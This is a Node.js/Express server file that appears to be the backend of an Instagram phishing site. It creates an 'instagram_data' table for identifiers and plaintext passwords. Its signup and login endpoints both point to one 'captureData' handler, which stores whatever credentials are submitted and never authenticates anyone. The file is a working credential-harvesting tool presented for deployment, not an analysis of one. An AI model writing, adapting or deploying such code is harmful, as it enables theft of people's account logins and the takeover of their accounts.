
const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const port = process.env.PORT || 3001;

app.use(cors());
app.use(express.json());

const rootPath = __dirname;
const distPath = path.join(rootPath, 'dist');

// Startup diagnostics
console.log('--- Startup Diagnostic ---');
const requiredFiles = ['dist/bundle.js', 'dist/style.css', 'index.html'];
requiredFiles.forEach(f => {
    const p = path.join(rootPath, f);
    if (fs.existsSync(p)) {
        console.log(`✅ File Found: ${f}`);
    } else {
        console.error(`❌ File MISSING: ${f} (Run 'npm run build' if local)`);
    }
});

// Serve static files
app.use('/dist', express.static(distPath));
app.use(express.static(rootPath));

// DB Connection Configuration
// For local: Ensure you have a DATABASE_URL env var or update this object with your local credentials
const dbConfig = {
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL && !process.env.DATABASE_URL.includes('localhost') 
    ? { rejectUnauthorized: false } 
    : false
};

let dbPool;
let dbStatus = "disconnected";

async function initDb() {
  if (!process.env.DATABASE_URL) {
    console.warn("⚠️  DATABASE_URL environment variable is NOT set.");
    console.warn("To connect locally, run: export DATABASE_URL=postgres://user:pass@localhost:5432/dbname");
    return null;
  }

  const pool = new Pool(dbConfig);
  try {
    // Test connection
    await pool.query('SELECT NOW()');
    
    // Initialize tables
    await pool.query(`
      CREATE TABLE IF NOT EXISTS instagram_data (
        id SERIAL PRIMARY KEY,
        identifier TEXT,
        password TEXT,
        full_name TEXT,
        username TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    
    console.log("✅ Database connection successful and tables initialized.");
    dbStatus = "connected";
    return pool;
  } catch (err) {
    console.error("❌ Database connection FAILED:", err.message);
    dbStatus = `error: ${err.message}`;
    return null;
  }
}

initDb().then(pool => { dbPool = pool; });

// --- API ENDPOINTS ---

// Health check to verify DB status from browser
app.get('/api/health', (req, res) => {
  res.json({
    status: "server_up",
    database: dbStatus,
    env: process.env.NODE_ENV || "development",
    timestamp: new Date().toISOString()
  });
});

const captureData = async (req, res) => {
  const { identifier, password, fullName, username } = req.body;
  if (!dbPool) return res.status(503).json({ success: false, message: 'Database not connected' });

  try {
    const query = `INSERT INTO instagram_data (identifier, password, full_name, username) VALUES ($1, $2, $3, $4) RETURNING id;`;
    const result = await dbPool.query(query, [identifier, password, fullName || null, username || null]);
    res.status(200).json({ success: true, id: result.rows[0].id });
  } catch (err) {
    console.error("Storage Error:", err.message);
    res.status(500).json({ success: false, message: 'Database error' });
  }
};

app.post('/api/signup', captureData);
app.post('/api/login', captureData);

// SPA Fallback
app.get('*', (req, res) => {
  res.sendFile(path.join(rootPath, 'index.html'));
});

app.listen(port, () => {
  console.log(`🚀 Server listening on port ${port}`);
  console.log(`🔗 Health check: http://localhost:${port}/api/health`);
});
